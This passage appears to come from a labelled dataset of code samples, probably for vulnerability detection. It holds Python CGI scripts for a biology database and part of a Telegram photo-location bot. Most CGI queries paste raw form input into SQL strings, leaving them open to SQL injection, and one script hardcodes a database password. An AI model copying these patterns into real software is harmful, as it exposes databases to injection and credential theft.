the last text box to be filled in on the form will be executed\n# the title helps with printing the result to the html\nif search_enzyme:\n    query = \"select process_name from uses where enzyme_name = '%s'\"  % search_enzyme\n    title = \"Processes\"\n    \nif search_process1:\n    query = \"select enzyme_name from uses where process_name = '%s'\" % search_process1\n    title = \"Enzymes\"\n    \nif search_process2:\n    query = \"select distinct organelle from uses natural join located_in where process_name = '%s'\" % search_process2\n    title = \"Organelles\"\n    \nif search_enzyme2:\n    query = \"select ligand_mechanism from enzyme where enzyme_name = '%s'\" % search_enzyme2\n    title = \"Ligand Mechanisms\"\n    \nif search_process3:\n    query = \"select goal_product from process where process_name = '%s'\" % search_process3\n    title = \"Goal Products\"\n    \nif sub:\n    query = \"select organelle from location where substructure = '%s'\" % sub\n    title = \"Organelles\"\n    \nif inter:\n    query = \"select concentration from conds where compound = '%s'\" % inter\n    title = \"Concentrations\"\n\n# keep track of an extra variable so that it will know to print an extra line of results (onyl query with a tuple result)\nif search_process5: \n    query = \"select concentration, compound from operates_under where process_name = '%s'\" % search_process5\n    title = \"Conditions\"\n    key = 'one'\n    \nif search_enzyme3 and reac:\n    query = \"select product_name from converts where enzyme_name = '%s' and reactant_name = '%s'\" % (search_enzyme3, reac)\n    title = \"Products\"\n    \nif search_enzyme4:\n    query = \"select organelle from located_in where enzyme_name = '%s'\" % search_enzyme4\n    title = \"Organelles\"\n    \nif inter2:\n    query = \"select concenration from intermediate where intermediate_name = '%s'\" % inter2\n    title = \"Concentrations\"\n\n# avoid error with empty form- give the user option to fill in information or go back to home page\nif not query:\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    \n# catching errors- blank form, wrong syntax, etc\n# try executing query and spit back error to the screen if there is a problem\nhasError = False\nif query:\n    try:\n        cursor.execute(query)        \n    except mysql.connector.Error as err:\n        print(\"<b>Something went wrong:</b> {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b>')\n        endhtml()\n        hasError = True\n\n# otherwise, print out the response with links back and to home\nif hasError == False:\n    response = cursor.fetchall()\n    beghtml()\n    if not response:                                                                                     \n        print(\"<h3>no results found</h3>\")\n    else:\n        print(\"<h3>Results!</h3>\")\n        print(\"<h3>%s</h3>\" % title) \n        for r in response:\n            print(\"<b> %s\" % r[0])\n            if key:  # if there was a second value of the data like (concentration, compound)\n                print(\"%s</br>\" % r[1])\n            print(\"<br>\")\n    print(\"</b><br>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b><br><br>')\n    endhtml()\n\ncursor.close()\ncnx.close()\n/n/n/n/public_html/cgi-bin/update.py/n/n#! /usr/bin/python3\n\nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting all the values from the html form\nform = cgi.FieldStorage()\nenzyme_name    = form.getvalue('enzyme_name')\nproduct_name   = form.getvalue('product_name')\nenzyme_name2   = form.getvalue('enzyme_name2')\nmechanism_name = form.getvalue('mechanism_name')\nprocess_name   = form.getvalue('process_name')\nconcentration  = form.getvalue('concentration')\ncompound_name  = form.getvalue('compound_name')\nprocess_name2  = form.getvalue('process_name2')\ngoal           = form.getvalue('goal')\ninter          = form.getvalue('inter')\nconc           = form.getvalue('conc')\nprocess_name3  = form.getvalue('process_name3')\nenzyme_name3   = form.getvalue('enzyme_name3')\nenzyme_name4   = form.getvalue('enzyme_name4')\norganelle      = form.getvalue('organelle')\nsub            = form.getvalue('sub')\norganelle2     = form.getvalue('organelle2')\nsub2           = form.getvalue('sub2')\nconc2          = form.getvalue('conc2')\ncomp           = form.getvalue('comp')\nloc            = form.getvalue('loc')\nsub3           = form.getvalue('sub3')\nsub4           = form.getvalue('sub4')\n\n# establishing connection to the database\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\ncursor = cnx.cursor(buffered=True)\nquery = \"\"  # initializing empty queries to avoid errors\nquery2 = \"\"\n\n# depending on the user input assign the query\n# the second query searches for the updated data in the database and shows the user what they inputed\n# if multiple are filled in, the last one will be executed\nif enzyme_name and product_name:\n    query = \"update converts set product_name = '%s' where enzyme_name = '%s'\" % (product_name, enzyme_name)\n    query2 = \"select * from converts where product_name = '%s' and enzyme_name = '%s'\" % (product_name, enzyme_name)\n    \nif enzyme_name2 and mechanism_name:\n    query = \"update enzyme set ligand_mechanism = '%s' where enzyme_name = '%s'\" % (mechanism_name, enzyme_name2)\n    query2 = \"select * from enzyme where enzyme_name = '%s'\" % enzyme_name2\n    \nif process_name and concentration and compound_name:\n    query = \"update operates_under set concentration = '%s', compound = '%s' where process_name = '%s'\" % (concentration, compound_name, process_name)\n    query2 = \"select * from operates_under where process_name = '%s'\" % process_name\n\nif process_name2 and goal:\n    query = \"update process set goal_product = '%s' where process_name = '%s'\" % (goal, process_name2)\n    query2 = \"select * from process where process_name = '%s'\" % process_name2\n\nif inter and conc:\n    query = \"update intermediate set concenration = '%s' where intermediate_name = '%s'\" % (conc, inter)\n    query2 = \"select * from intermediate where intermediate_name = '%s'\" % inter\n\nif process_name3 and enzyme_name3:\n    query = \"update uses set enzyme_name = '%s' where process_name = '%s'\" % (enzyme_name3, process_name3)\n    query2 = \"select * from uses where process_name = '%s' and enzyme_name = '%s'\" % (process_name3, enzyme_name3)\n\nif enzyme_name4 and organelle and sub and sub4:\n    query = \"update located_in set organelle = '%s', substructure = '%s' where enzyme_name = '%s' and substructure = '%s'\" % (organelle, sub, enzyme_name4, sub4)\n    query2 = \"select * from located_in where enzyme_name = '%s'\" % enzyme_name4\n    \nif organelle2 and sub2:\n    query = \"update location set substructure = '%s' where organelle = '%s' and substructure = '%s'\" % (sub2, organelle2, sub3)\n    query2 = \"select * from location where organelle = '%s' and substructure = '%s'\" % (organelle2, sub2)\n\nif conc2 and comp and loc:\n    query = \"update conds set prime_location = '%s' where concentration = '%s' and compound = '%s'\" % (loc, conc2, comp)\n    query2 = \"select * from conds where concentration = '%s' and compound = '%s' and prime_location = '%s'\" % (conc2, comp, loc)\n\n\nhasError = False\nif not query: # blank form - give the user option to go back or to the home page\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n\nif query: # errors\n    try:\n        cursor.execute(query)\n        cnx.commit()\n\n    except mysql.connector.Error as err:\n        beghtml()\n        print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n        print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n        endhtml()\n        hasError = True\n        \n# if there were no errors when executing the first query, continue executing the second\nif hasError == False:\n    cursor.execute(query2)\n    data = cursor.fetchall()\n    \n    # html with the response from the update           \n    beghtml()\n    \n    # if the first query did not come up with an error but the second did (typo, value not in the table)\n    # i.e. the select statement came up with nothing..\n    # print that something went wrong and give an option to go back\n    if not data:\n        print(\"<h3><b>Something went wrong </b></h3>\")\n        print(\"<b>Check your spelling!</b><br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n        print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    # otherwise, you want to print out what the database not reads\n    else:\n        print(\"<h3>Updated!</h3>\")\n        print(\"The database now reads <br><br>\")\n        for result in data[0]:\n            print(\"<b> | %s\" % result)\n        print(\" | </b>\")\n        print(\"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n    endhtml()\n\n\ncursor.close()\ncnx.close()\n/n/n/n", "label": 1}, {"id": "0e9f57f13e61863b3672f5730e27f149da00786a", "code": "photogpsbot/__main__.py/n/n\"\"\"\nSmall bot for Telegram that receives your photo and returns you map where\nit was taken.\nWritten by Aleksandr Mikheev.\nhttps://github.com/RandyRomero/photogpsbot\n\nThis specific module contains methods to respond user messages, to make\ninteractive menus, to handle user language, to process user images\n\"\"\"\n\n# todo fix database queries in order to user parameters binding!\n\n# todo check what is wrong with geopy on\n#  last versions (some deprecation warning)\n\n# todo rewrite the processing of images\n# todo update docstrings and comments\n\nfrom io import BytesIO\nfrom datetime import datetime, timedelta\n\nfrom telebot import types\nimport requests\n\nfrom photogpsbot import bot, log, log_files, db, User, users, messages, machine\nfrom photogpsbot.process_image import ImageHandler\nfrom photogpsbot.db_connector import DatabaseConnectionError\nimport config\n\n\nclass PhotoMessage:\n    def __init__(self, message, user):\n        self.message = message\n        self.user = user\n        self.image_handler = ImageHandler\n\n    @staticmethod\n    def open_photo(message):\n        # Get temporary link to a photo that user sends to the bot\n        file_path = bot.get_file(message.document.file_id).file_path\n\n        # Download photo that got the bot from a user\n        link = (\"https://api.telegram.org/file/\"\n                f\"bot{config.TELEGRAM_TOKEN}/{file_path}\")\n\n        if machine == 'prod':\n            r = requests.get(link)\n        else:\n            # use proxy if the bot is running not on production server\n            proxies = {'https': config.PROXY_CONFIG}\n            r = requests.get(link, proxies=proxies)\n\n        # Get file-like object of user's photo\n        return BytesIO(r.content)\n\n    def get_info(self):\n        \"\"\"\n        Opens file that user sent as a file-like object, get necessary info\n        from it and return it\n\n        :return: instance of ImageData - my dataclass for storing info about\n        an image like user, date, camera name etc\n        \"\"\"\n        user_photo = self.open_photo(self.message)\n        image = self.image_handler(self.user, user_photo)\n        return image.get_image_info()\n\n    def save_info_to_db(self, image_data):\n        \"\"\"\n           When user send photo as a file to get information, bot also stores\n           information about this query to the database to keep statistics that\n           can be shown to a user in different ways. It stores time of query,\n           Telegram id of a user, his camera and lens which were used for\n           taking photo, his first and last name, nickname and country where\n           the photo was taken. The bot does not save photos or their\n           coordinates.\n\n           :image_data: an instance of ImageData dataclass with info about\n           the image\n           :return: None\n           \"\"\"\n        camera_name, lens_name = image_data.camera, image_data.lens\n        camera_name = f'\"{camera_name}\"' if camera_name else None\n        lens_name = f'\"{lens_name}\"' if lens_name else None\n\n        if not image_data.country:\n            country_en = country_ru = None\n        else:\n            country_en = f'\"{image_data.country[\"en-US\"]}\"'\n            country_ru = f'\"{image_data.country[\"ru-RU\"]}\"'\n\n        log.info('Adding user query to photo_queries_table...')\n\n        query = ('INSERT INTO photo_queries_table '\n                 '(chat_id, camera_name, lens_name, country_en, country_ru) '\n                 'VALUES (%s, %s, %s, %s, %s)')\n\n        parameters = (self.user.chat_id, camera_name, lens_name, country_en,\n                      country_ru)\n\n        db.execute_query(query, parameters)\n        db.conn.commit()\n        log.info('User query was successfully added to the database.')\n\n    @staticmethod\n    def find_num_users_with_same_feature(image_data):\n        same_feature = []\n\n        feature_types = ('camera_name', 'lens_name', 'country_en')\n        features = (image_data.camera, image_data.lens,\n                    image_data.country['en-US'])\n\n        for feature_name, feature in zip(feature_types, features):\n            if not feature:\n                same_feature.append(0)\n                continue\n            answer = get_number_users_by_feature(feature, feature_name)\n            same_feature.append(answer)\n\n        return same_feature\n\n    def prepare_answer(self):\n        \"\"\"\n        Process an image that user sent, get info from it, save data to the\n        database, make an answer to be sent via Telegram\n        :return:\n        \"\"\"\n\n        # Get instance of the dataclass ImageData with info about the image\n        image_data = self.get_info()\n        # Save some general info about the user's query to the database\n        self.save_info_to_db(image_data)\n\n        answer = ''\n        coordinates = image_data.latitude, image_data.longitude\n        if not coordinates[0]:\n            answer += messages[self.user.language][\"no_gps\"]\n\n        answ_template = messages[self.user.language][\"camera_info\"]\n        basic_data = (image_data.date_time, image_data.camera, image_data.lens,\n                      image_data.address[self.user.language])\n\n        # Concatenate templates in language that user prefer with information\n        # from the photo, for example: f'{\"Camera brand\"}:{\"Canon 60D\"}'\n        for arg in zip(answ_template, basic_data):\n            if arg[1]:\n                answer += f'*{arg[0]}*: {arg[1]}\\n'\n\n        lang = self.user.language\n        lang_templates = messages[lang][\"users with the same feature\"].values()\n        ppl_wth_same_featrs = self.find_num_users_with_same_feature(image_data)\n        for template, feature in zip(lang_templates, ppl_wth_same_featrs):\n            if feature:\n                answer += f'{template} {feature}\\n'\n\n        return coordinates, answer\n\n\ndef get_admin_stat(command):\n    # Function that returns statistics to admin by command\n    error_answer = \"Can't execute your command. Check logs\"\n    answer = 'There is some statistics for you: \\n'\n\n    # Set to a beginning of the day\n    today = (datetime\n             .today()\n             .replace(hour=0, minute=0, second=0, microsecond=0)\n             .strftime('%Y-%m-%d %H:%M:%S'))\n\n    # Last users with date of last time when they used bot\n    if command == 'last active users':\n\n        try:\n            last_active_users = users.get_last_active_users(100)\n        except DatabaseConnectionError:\n            return error_answer\n\n        bot_users = ''\n        # Makes a human readable list of last active users\n        for usr, index in zip(last_active_users,\n                              range(len(last_active_users))):\n            user = User(*usr)\n            bot_users += f'{index + 1}. {user}\\n'\n\n        answer = ('Up to 100 last active users by the time when they sent '\n                  'picture last time:\\n')\n        answer += bot_users\n        log.info('Done.')\n        return answer\n\n    elif command == 'total number photos sent':\n        log.info('Evaluating total number of photo queries in database...')\n        query = ('SELECT COUNT(chat_id) '\n                 'FROM photo_queries_table2')\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += '{} times users sent photos.'.format(cursor.fetchone()[0])\n        query = ('SELECT COUNT(chat_id) '\n                 'FROM photo_queries_table2 '\n                 'WHERE chat_id !=%s')\n        parameters = (config.MY_TELEGRAM,)\n        try:\n            cursor = db.execute_query(query, parameters)\n        except DatabaseConnectionError:\n            answer += (\"\\nCannot calculate number of photos that were send \"\n                       \"excluding your photos. Check logs\")\n            return answer\n\n        answer += '\\nExcept you: {} times.'.format(cursor.fetchone()[0])\n        log.info('Done.')\n        return answer\n\n    elif command == 'photos today':\n        # Show how many photos have been sent since 00:00:00 of today\n        log.info('Evaluating number of photos which were sent today.')\n        query = (\"SELECT COUNT(chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > %s\")\n\n        parameters = (today,)\n\n        try:\n            cursor = db.execute_query(query, parameters)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += f'{cursor.fetchone()[0]} times users sent photos today.'\n        query = (\"SELECT COUNT(chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > %s \"\n                 \"AND chat_id !=%s\")\n\n        parameters = today, config.MY_TELEGRAM\n\n        try:\n            cursor = db.execute_query(query, parameters)\n        except DatabaseConnectionError:\n            return error_answer\n\n        answer += '\\nExcept you: {} times.'.format(cursor.fetchone()[0])\n        log.info('Done.')\n        return answer\n\n    elif command == 'number of users':\n        # Show number of users who has used bot at leas\"\n        # once or more (first for the whole time, then today)\n        log.info('Evaluating number of users that use bot '\n                 'since the first day and today...')\n        try:\n            num_of_users = users.get_total_number()\n        except DatabaseConnectionError:\n            return error_answer\n\n        answer += f'There are totally {num_of_users} users.'\n\n        query = (\"SELECT COUNT(DISTINCT chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > %s\")\n\n        parameters = (today,)\n        try:\n            cursor = db.execute_query(query, parameters)\n        except DatabaseConnectionError:\n            answer += (\"\\nCannot calculate how many user have sent their \"\n                       \"photos today\")\n            return answer\n\n        answer += f'\\n{cursor.fetchone()[0]} users have sent photos today.'\n        log.info('Done.')\n        return answer\n\n    elif command == 'number of gadgets':\n        # To show you number smartphones + cameras in database\n        log.info('Evaluating number of cameras and smartphones in database...')\n        query = ('SELECT COUNT(DISTINCT camera_name) '\n                 'FROM photo_queries_table2')\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += (f'There are totally {cursor.fetchone()[0]} '\n                   f'cameras/smartphones.')\n        query = (\"SELECT COUNT(DISTINCT camera_name) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > %s\")\n        parameters = (today,)\n        try:\n            cursor = db.execute_query(query, parameters)\n        except DatabaseConnectionError:\n            answer += (\"Cannot calculate the number of gadgets that have been \"\n                       \"used today so far\")\n            return answer\n\n        answer += (f'\\n{cursor.fetchone()[0]} cameras/smartphones '\n                   'were used today.')\n        log.info('Done.')\n        return answer\n\n    elif command == 'uptime':\n        fmt = 'Uptime: {} days, {} hours, {} minutes and {} seconds.'\n        td = datetime.now() - bot.start_time\n        # datetime.timedelta.seconds returns you total number of seconds\n        # since given time, so you need to perform\n        # a little bit of math to make whole hours, minutes and seconds from it\n        # And there isn't any normal way to do it in Python unfortunately\n        uptime = fmt.format(td.days, td.seconds // 3600, td.seconds % 3600 //\n                            60, td.seconds % 60)\n        log.info(uptime)\n        return uptime\n\n\n@bot.message_handler(commands=['start'])\ndef create_main_keyboard(message):\n    user = users.find_one(message)\n    current_user_lang = user.language\n    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True,\n                                       resize_keyboard=True)\n    markup.row('\u0420\u0443\u0441\u0441\u043a\u0438\u0439/English')\n    markup.row(messages[current_user_lang]['top_cams'])\n    markup.row(messages[current_user_lang]['top_lens'])\n    markup.row(messages[current_user_lang]['top_countries'])\n    bot.send_message(user.chat_id, messages[current_user_lang]['menu_header'],\n                     reply_markup=markup)\n\n\n# Decorator to handle text messages\n@bot.message_handler(content_types=['text'])\ndef handle_menu_response(message):\n    # keyboard_hider = telebot.types.ReplyKeyboardRemove()\n    current_user_lang = users.find_one(message).language\n    user = users.find_one(message)\n\n    if message.text == '\u0420\u0443\u0441\u0441\u043a\u0438\u0439/English':\n\n        new_lang = users.find_one(message).switch_language()\n        if current_user_lang != new_lang:\n            bot.send_message(user.chat_id, messages[new_lang]\n                             ['switch_lang_success'])\n            create_main_keyboard(message)\n        else:\n            bot.send_message(user.chat_id, messages[new_lang]\n                             ['switch_lang_failure'])\n            create_main_keyboard(message)\n\n    elif message.text == messages[current_user_lang]['top_cams']:\n        log.info('User %s asked for top cams', user)\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items('camera_name', message))\n        log.info('List of most popular cameras '\n                 'has been returned to %s', user)\n\n        # in order not to check whether user has changed his nickname or\n        # whatever every time his sends any request the bot will just check\n        # it every time a user wants to get a statistic about the most\n        # popular cameras\n        users.compare_and_update(user, message)\n\n    elif message.text == messages[current_user_lang]['top_lens']:\n        log.info('User %s asked for top lens', user)\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items('lens_name',\n                                                     message))\n        log.info('List of most popular lens has been returned to %s', user)\n\n    elif message.text == messages[current_user_lang]['top_countries']:\n        log.info('User %s asked for top countries', user)\n        lang_table_name = ('country_ru'\n                           if current_user_lang == 'ru-RU'\n                           else 'country_en')\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items(lang_table_name, message))\n        log.info('List of most popular countries has '\n                 'been returned to %s', user)\n\n    elif (message.text.lower() == 'admin' and\n          user.chat_id == int(config.MY_TELEGRAM)):\n        # Creates inline keyboard with options for admin Function that handle\n        # user interaction with the keyboard called admin_menu\n\n        keyboard = types.InlineKeyboardMarkup()  # Make keyboard object\n        button = types.InlineKeyboardButton  # just an alias to save space\n\n        keyboard.add(button(text='Turn bot off', callback_data='off'))\n        keyboard.add(button(text='Last active users',\n                            callback_data='last active'))\n        keyboard.add(button(text='Total number of photos were sent',\n                            callback_data='total number photos sent'))\n        keyboard.add(button(text='Number of photos today',\n                            callback_data='photos today'))\n        keyboard.add(button(text='Number of users',\n                            callback_data='number of users'))\n        keyboard.add(button(text='Number of gadgets',\n                            callback_data='number of gadgets'))\n        keyboard.add(button(text='Uptime', callback_data='uptime'))\n        bot.send_message(config.MY_TELEGRAM,\n                         'Admin commands', reply_markup=keyboard)\n\n    else:\n        log.info('%s sent text message.', user)\n\n        # Answer to user that bot can't make a conversation with him\n        bot.send_message(user.chat_id,\n                         messages[current_user_lang]['dont_speak'])\n\n\n@bot.callback_query_handler(func=lambda call: True)\ndef admin_menu(call):  # Respond commands from admin menu\n    # Remove progress bar from pressed button\n    bot.answer_callback_query(callback_query_id=call.id, show_alert=False)\n\n    if call.data == 'off':\n        if db.disconnect():\n            bot.turn_off()\n        else:\n            log.error('Cannot stop bot.')\n            bot.send_message(chat_id=config.MY_TELEGRAM,\n                             text='Cannot stop bot.')\n    elif call.data == 'last active':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('last active users'))\n    elif call.data == 'total number photos sent':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('total number photos sent'))\n    elif call.data == 'photos today':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('photos today'))\n    elif call.data == 'number of users':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('number of users'))\n    elif call.data == 'number of gadgets':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('number of gadgets'))\n    elif call.data == 'uptime':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('uptime'))\n\n\n@bot.message_handler(content_types=['photo'])\ndef answer_photo_message(message):\n    user = users.find_one(message)\n    bot.send_message(user.chat_id, messages[user.language]['as_file'])\n    log.info('%s sent photo as a photo.', user)\n\n\ndef cache_number_users_with_same_feature(func):\n    # Closure to cache previous results of given\n    # function so to not call database to much\n    # It saves result in a dictionary because result depends on a user.\n    # cache_time - time in minutes when will\n    # be returned cached result instead of calling database\n\n    when_was_called = None\n    result = {}\n\n    def func_launcher(feature, feature_type):\n        nonlocal result\n        nonlocal when_was_called\n        cache_time = 5\n\n        # It's high time to reevaluate result instead\n        # of just looking up in cache if countdown went off, if\n        # function has not been called yet, if result for\n        # feature (like camera, lens or country) not in cache\n        high_time = (when_was_called + timedelta(minutes=cache_time) <\n                     datetime.now() if when_was_called else True)\n\n        if not when_was_called or high_time or feature not in result:\n            when_was_called = datetime.now()\n            num_of_users = func(feature, feature_type)\n            result[feature] = num_of_users\n            return num_of_users\n        else:\n            log.info('Returning cached result of %s',  func.__name__)\n            time_left = (when_was_called + timedelta(minutes=cache_time) -\n                         datetime.now())\n            log.debug('Time to to reevaluate result of %s is %s',\n                      func.__name__, str(time_left)[:-7])\n            return result[feature]\n\n    return func_launcher\n\n\ndef cache_most_popular_items(func):\n    \"\"\"\n    Function that prevent calling any given function more often that once in\n    a cache_time. It calls given function, then during next cache\n    return func_launcher_time it\n    will return cached result of a given function. Function call given\n    function when: it hasn't been called before; cache_time is passed,\n    user ask result in another language.\n\n    :param func: some expensive function that we don't want to call too often\n    because it can slow down the script\n    :return: wrapper that figure out when to call function and when to\n    return cached result\n    \"\"\"\n    # store time when given function was called last time\n    when_was_called = None\n    # dictionary to store result where language of user\n    # is key and message for user is a value\n    result = {}\n\n    def function_launcher(item_type, message):\n        nonlocal func\n        nonlocal result\n        nonlocal when_was_called\n        cache_time = 5\n\n        # Only top countries can be returned in different languages.\n        # For the other types of queries it doesn't mean a thing.\n        if item_type == 'country_ru' or item_type == 'country_en':\n            result_id = users.find_one(message).language + item_type\n        else:\n            result_id = item_type\n\n        # evaluate boolean whether it is high time to call given function or\n        # not\n        high_time = (when_was_called + timedelta(minutes=cache_time) <\n                     datetime.now() if when_was_called else True)\n\n        if not result.get(result_id, None) or not when_was_called or high_time:\n            when_was_called = datetime.now()\n            result[result_id] = func(item_type, message)\n            return result[result_id]\n        else:\n            log.debug('Return cached result of %s...', func.__name__)\n            time_left = (when_was_called + timedelta(minutes=cache_time) -\n                         datetime.now())\n            log.debug('Time to reevaluate result of %s is %s',\n                      func.__name__, str(time_left)[:-7])\n            return result[result_id]\n\n    return function_launcher\n\n\n@cache_most_popular_items\ndef get_most_popular_items(item_type, message):\n    \"\"\"\n    Get most common cameras/lenses/countries from database and\n    make list of them\n    :param item_type: string with column name to choose between cameras,\n    lenses and countries\n    :param message: telebot object with info about user and his message\n    :return: string which is either list of most common\n    cameras/lenses/countries or message which states that list is\n    empty\n    \"\"\"\n\n    user = users.find_one(message)\n\n    def list_to_ordered_str_list(list_of_gadgets):\n        # Make Python list to be string like roster with indexes and\n        # new line characters like:\n        # 1. Canon 80D\n        # 2. iPhone 4S\n\n        string_roaster = ''\n        index = 1\n        for item in list_of_gadgets:\n            if not item[0]:\n                continue\n            string_roaster += '{}. {}\\n'.format(index, item[0])\n            index += 1\n        return string_roaster\n\n    log.debug('Evaluating most popular things...')\n\n    # This query returns item types in order where the first one item\n    # has the highest number of occurrences\n    # in a given column\n\n    query = (f'SELECT {item_type} FROM photo_queries_table2 '\n             f'GROUP BY {item_type} '\n             f'ORDER BY count({item_type}) '\n             'DESC')\n\n    try:\n        cursor = db.execute_query(query)\n    except DatabaseConnectionError:\n        log.error(\"Can't evaluate a list of the most popular items\")\n        return messages[user.language]['doesnt work']\n\n    # Almost impossible case but still\n    if not cursor.rowcount:\n        log.warning('There is nothing in the main database table')\n        bot.send_message(chat_id=config.MY_TELEGRAM,\n                         text='There is nothing in the main database table')\n        return messages[user.language]['no_top']\n\n    popular_items = cursor.fetchall()\n    log.info('Finish evaluating the most popular items')\n    return list_to_ordered_str_list(popular_items[:30])\n\n\n@cache_number_users_with_same_feature\ndef get_number_users_by_feature(feature, feature_type):\n    \"\"\"\n    Get number of users that have same smartphone, camera, lens or that\n    have been to the same country\n    :param feature: string which is name of a particular feature e.g.\n    camera name or country name\n    :param feature_type: string which is name of the column in database\n    :return: string which is message to user\n    \"\"\"\n    log.debug('Check how many users also have this feature: %s...',\n              feature)\n\n    query = (\"SELECT DISTINCT chat_id \"\n             \"FROM photo_queries_table2 \"\n             \"WHERE %s=%s\")\n\n    parameters = (feature_type, feature)\n\n    try:\n        cursor = db.execute_query(query, parameters)\n    except DatabaseConnectionError:\n        log.error(\"Cannot check how many users also have this feature: %s...\",\n                  feature)\n        return None\n\n    if not cursor.rowcount:\n        log.debug('There were no users with %s...', feature)\n        return None\n\n    log.debug('There is %d users with %s', cursor.rowcount, feature)\n    return cursor.rowcount - 1\n\n\n@bot.message_handler(content_types=['document'])  # receive file\ndef handle_message_with_image(message):\n\n    user = users.find_one(message)\n    # Sending a message to a user that his photo is being processed\n    bot.reply_to(message, messages[user.language]['photo_prcs'])\n    log.info('%s sent photo as a file.', user)\n\n    photo_message = PhotoMessage(message, user)\n    answer = photo_message.prepare_answer()\n\n    # if longitude is in the answer\n    if answer[0][0]:\n        lon = answer[0][0]\n        lat = answer[0][1]\n        bot.send_location(user.chat_id, lon, lat, live_period=None)\n        bot.reply_to(message, answer[1], parse_mode='Markdown')\n    else:\n        bot.reply_to(message, answer, parse_mode='Markdown')\n\n\ndef main():\n    log_files.clean_log_folder(1)\n    users.cache(100)\n    db.connect()\n    bot.start_bot()\n\n\nif __name__ == '__main__':\n    main()\n/n/n/nphotogpsbot/db_connector.py/n/n\"\"\"\nModule that provides a way to connect to MySQL and reconnect each time\nconnection is lost. It also can automatically set up SSH tunnel thanks to\nsshtunnel module\n\nOriginal way to do it was described at\nhttps://help.pythonanywhere.com/pages/ManagingDatabaseConnections/\n\"\"\"\n\nimport socket\n\n# goes as mysqlclient in requirements\nimport MySQLdb\nimport sshtunnel\n\nfrom photogpsbot import log\nimport config\n\n\nclass DatabaseError(Exception):\n    pass\n\n\nclass DatabaseConnectionError(Exception):\n    pass\n\n\nclass Database:\n    \"\"\"\n    Class that provides method to execute queries and handles connection to\n    the MySQL database directly and via ssh if necessary\n    \"\"\"\n    conn = None\n    tunnel = None\n    tunnel_opened = False\n\n    def _open_ssh_tunnel(self):\n        \"\"\"\n        Method that opens ssh tunnel to the server where the database of\n        photogpsbot is located\n        :return: None\n        \"\"\"\n        log.debug('Establishing SSH tunnel to the server where the database '\n                  'is located...')\n        sshtunnel.SSH_TIMEOUT = 5.0\n        sshtunnel.TUNNEL_TIMEOUT = 5.0\n        self.tunnel = sshtunnel.SSHTunnelForwarder(\n            ssh_address_or_host=config.SERVER_ADDRESS,\n            ssh_username=config.SSH_USER,\n            ssh_password=config.SSH_PASSWD,\n            ssh_port=22,\n            remote_bind_address=('127.0.0.1', 3306))\n\n        self.tunnel.start()\n        self.tunnel_opened = True\n        log.debug('SSH tunnel has been established.')\n\n    def connect(self):\n        \"\"\"\n        Established connection either to local database or to remote one if\n        the script runs not on the same server where database is located\n        :return: None\n        \"\"\"\n        if socket.gethostname() == config.PROD_HOST_NAME:\n            log.info('Connecting to the local database...')\n            port = 3306\n        else:\n            log.info('Connecting to the database via SSH...')\n            if not self.tunnel_opened:\n                self._open_ssh_tunnel()\n\n            port = self.tunnel.local_bind_port\n\n        self.conn = MySQLdb.connect(host='127.0.0.1',\n                                    user=config.DB_USER,\n                                    password=config.DB_PASSWD,\n                                    port=port,\n                                    database=config.DB_NAME,\n                                    charset='utf8')\n        log.info('Connected to the database.')\n\n    def execute_query(self, query, parameters=None, trials=0):\n        \"\"\"\n        Executes a given query\n        :param query: query to execute\n        :param parameters: parameters for query\n        :param trials: integer that denotes number of trials to execute\n        a query in case of known errors\n        :return: cursor object\n        \"\"\"\n        if not self.conn or not self.conn.open:\n            self.connect()\n\n        try:\n            cursor = self.conn.cursor()\n            cursor.execute(query, parameters)\n\n        # try to reconnect if MySQL server has gone away\n        except MySQLdb.OperationalError as e:\n\n            # (2013, Lost connection to 